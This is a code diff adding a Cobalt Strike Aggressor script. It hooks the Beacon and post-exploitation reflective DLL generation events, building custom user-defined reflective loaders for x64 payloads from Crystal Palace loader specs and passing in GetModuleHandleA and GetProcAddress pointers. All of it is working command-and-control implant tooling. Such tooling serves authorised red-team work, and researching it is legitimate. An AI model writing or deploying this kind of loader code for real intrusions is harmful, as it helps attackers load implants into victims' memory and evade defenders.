@@ -1,0 +1,116 @@
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+# ------------------------------------
+# $1 - Beacon payload file name
+# $2 - Beacon payload (dll binary)
+# $3 - Beacon architecture (x86/x64)
+# ------------------------------------
+set BEACON_RDLL_GENERATE {
+    local('$beacon $arch $spec_path $spec $payload $len');
+    
+    $beacon = $2;
+    $arch   = $3;
+
+    if ($arch eq "x86") {
+        warn("x86 not supported, returning default.");
+        return $null;
+    }
+
+    $spec_path = getFileProper(script_resource("udrl"), "loader.spec");
+    $spec      = [LinkSpec Parse: $spec_path];
+    $payload   = [$spec run: $beacon, [new HashMap]];
+    $len       = strlen($payload);
+
+    if ($len == 0) {
+        warn("Failed to build UDRL, returning default.");
+        return $null;
+    }
+
+    println("Built UDRL: " . $len . " bytes.");
+    return $payload;
+}
+
+# ------------------------------------
+# $1 - Beacon payload file name
+# $2 - Beacon architecture (x86/x64)
+# ------------------------------------
+set BEACON_RDLL_SIZE {
+   return "0";
+}
+
+# ------------------------------------
+# $1 - Beacon payload file name
+# $2 - Beacon payload (dll binary)
+# $3 - Beacon architecture (x86/x64)
+# $4 - Parent beacon ID
+# $5 - GetModuleHandleA pointer
+# $6 - GetProcAddress pointer
+# ------------------------------------
+set BEACON_RDLL_GENERATE_LOCAL {
+    local('$beacon $arch $spec_path $spec $hashMap $final $len');
+   
+    $beacon = $2;
+    $arch   = $3;
+
+    if ($arch eq "x86") {
+        warn("x86 not supported, returning default.");
+        return $null;
+    }
+
+    $spec_path = getFileProper(script_resource("patch-udrl"), "loader.spec");
+    $spec      = [LinkSpec Parse: $spec_path];
+    $hashMap   = [new HashMap];
+
+    [$hashMap put: "\$GMH", cast($5, 'b')];
+    [$hashMap put: "\$GPA", cast($6, 'b')];
+
+    $final = [$spec run: $beacon, $hashMap];
+    $len   = strlen($final);
+
+    if ($len == 0) {
+        warn("Failed to build UDRL, returning default.");
+        return $null;
+    }
+
+    println("Built UDRL: " . $len . " bytes.");
+    return $final;
+}
+
+# ------------------------------------
+# $1 – Post-ex payload file name
+# $2 – Post-ex payload (dll binary)
+# $3 – Post-ex architecture (x86/x64)
+# $4 – parent Beacon ID
+# $5 – GetModuleHandle pointer
+# $6 – GetProcAddress pointer
+# ------------------------------------
+set POSTEX_RDLL_GENERATE {
+    local('$postex $arch $spec_path $spec $hashMap $final $len');
+   
+    $postex = $2;
+    $arch   = $3;
+
+    if ($arch eq "x86") {
+        warn("x86 not supported, returning default.");
+        return $null;
+    }
+
+    $spec_path = getFileProper(script_resource("postex-udrl"), "loader.spec");
+    $spec      = [LinkSpec Parse: $spec_path];
+    $hashMap   = [new HashMap];
+
+    [$hashMap put: "\$GMH", cast($5, 'b')];
+    [$hashMap put: "\$GPA", cast($6, 'b')];
+
+    $final = [$spec run: $postex, $hashMap];
+    $len   = strlen($final);
+
+    if ($len == 0) {
+        warn("Failed to build reflective loader");
+        return $null;
+    }
+
+    println("Built postex UDRL: " . $len . " bytes.");
+    return $final;
+}
